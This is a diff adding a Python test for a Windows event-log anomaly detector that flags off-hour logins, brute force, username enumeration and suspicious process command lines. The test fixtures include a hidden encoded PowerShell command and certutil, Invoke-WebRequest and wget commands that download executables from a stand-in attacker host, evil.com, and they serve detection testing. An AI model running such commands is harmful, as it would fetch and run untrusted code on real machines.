@@ -211,6 +211,86 @@ def t3():
 check("任务7b", "会话重建: 4624↔4634按(host,LogonId)配对算时长 / 未注销标active / 孤儿注销标no_login_record", t3)
 
 
+# ---------- t4：任务8 异常预标记规则 ----------
+def t4():
+    from windows_evtx import xml_to_event
+    from anomaly import apply_anomaly_rules
+
+    def login(user, ip, ts):
+        return xml_to_event(ev_xml(4624, ts=ts, TargetUserName=user,
+                                   LogonType="3", IpAddress=ip, TargetLogonId="0x1"))
+
+    def failed(user, ip, ts, sub="0xc000006a"):
+        return xml_to_event(ev_xml(4625, ts=ts, TargetUserName=user,
+                                   LogonType="3", IpAddress=ip, SubStatus=sub))
+
+    def proc(cmdline, ts):
+        return xml_to_event(ev_xml(4688, ts=ts, SubjectUserName="IEUser",
+                                   NewProcessName="C:\\Windows\\a.exe", CommandLine=cmdline))
+
+    events = [
+        # offhour_login：UTC 19:00Z → UTC+8 是次日凌晨03:00 → 命中
+        login("bob", "10.0.2.17", "2020-09-09T19:00:00Z"),
+        # 白天登录（UTC+8 上午11点）→ 不命中
+        login("bob", "10.0.2.17", "2020-09-09T03:00:00Z"),
+        # brute_force：同(user,src_ip) 2分钟内3连败 → 全标
+        failed("bob", "10.0.2.17", "2020-09-09T10:00:00Z", sub="0xc000006a"),
+        failed("bob", "10.0.2.17", "2020-09-09T10:01:30Z", sub="0xc000006a"),
+        failed("bob", "10.0.2.17", "2020-09-09T10:02:00Z", sub="0xc000006a"),
+        # 只失败2次 → 不标brute_force
+        failed("carol", "10.0.2.18", "2020-09-09T10:00:00Z", sub="0xc000006a"),
+        failed("carol", "10.0.2.18", "2020-09-09T10:01:00Z", sub="0xc000006a"),
+        # username_enumeration：同src_ip换3个用户名、全是"用户不存在" → 全标
+        failed("u1", "10.0.2.99", "2020-09-09T11:00:00Z", sub="0xC0000064"),
+        failed("u2", "10.0.2.99", "2020-09-09T11:01:00Z", sub="0xc0000064"),
+        failed("u3", "10.0.2.99", "2020-09-09T11:02:00Z", sub="0XC0000064"),
+        # 同src_ip但SubStatus是密码错 → 不算枚举
+        failed("bob", "10.0.2.77", "2020-09-09T11:00:00Z", sub="0xc000006a"),
+        failed("bob", "10.0.2.77", "2020-09-09T11:01:00Z", sub="0xc000006a"),
+        # encoded_exec → 命中sev3
+        proc("powershell -enc SQBFAFgA -w hidden", "2020-09-09T12:00:00Z"),
+        # remote_download → 命中sev2
+        proc("certutil -urlcache -f http://evil.com/a.exe a.exe", "2020-09-09T12:05:00Z"),
+        proc("powershell -c Invoke-WebRequest http://evil.com/b.exe", "2020-09-09T12:06:00Z"),
+        proc("wget http://evil.com/c.exe", "2020-09-09T12:07:00Z"),
+        # 正常命令行 → 不命中
+        proc("ping 1.2.3.4", "2020-09-09T12:10:00Z"),
+        proc("netstat -ano", "2020-09-09T12:11:00Z"),
+    ]
+    stats = apply_anomaly_rules(events)
+
+    by_flag = {f: [e for e in events if f in e["anomaly_flags"]] for f in stats["by_rule"]}
+
+    # offhour：只命中凌晨那条
+    assert len(by_flag["offhour_login"]) == 1, f"offhour应命中1条: {stats}"
+    assert by_flag["offhour_login"][0]["timestamp"].startswith("2020-09-10T03")
+    # brute_force：3连败全标；carol的2连败不标
+    assert len(by_flag["brute_force"]) == 3, f"brute_force应命中3条: {stats}"
+    assert all(e["user"] == "bob" for e in by_flag["brute_force"])
+    # username_enumeration：3个不同用户同src_ip全标；密码错的组不标
+    assert len(by_flag["username_enumeration"]) == 3, f"枚举应命中3条: {stats}"
+    assert all(e["src_ip"] == "10.0.2.99" for e in by_flag["username_enumeration"])
+    # encoded_exec / remote_download
+    assert len(by_flag["encoded_exec"]) == 1 and len(by_flag["remote_download"]) == 3
+    # severity取最高：offhour那条=2；brute_force那条=3
+    assert by_flag["offhour_login"][0]["severity"] == 2
+    assert by_flag["brute_force"][0]["severity"] == 3
+    assert by_flag["remote_download"][0]["severity"] == 2
+    # 正常事件零标记
+    for e in events:
+        if e["event_type"] == "process_start" and e["cmdline"] in ("ping 1.2.3.4", "netstat -ano"):
+            assert e["anomaly_flags"] == [] and e["severity"] == 0, f"误报: {e['cmdline']}"
+    # 统计口径正确：flagged=1+3+3+1+3=11
+    assert stats["flagged"] == 11, f"flagged应为11: {stats}"
+    # 幂等：再跑一遍结果不变（不重复追加flag）
+    stats2 = apply_anomaly_rules(events)
+    assert stats2 == stats, f"规则引擎必须幂等: {stats2} vs {stats}"
+
+
+check("任务8", "异常预标记: offhour/brute_force/username_enumeration/encoded_exec/"
+               "remote_download 5规则命中+不误报+severity取最高+幂等", t4)
+
+
 # ---------- 汇总 ----------
 print("-" * 56)
 if all(results):
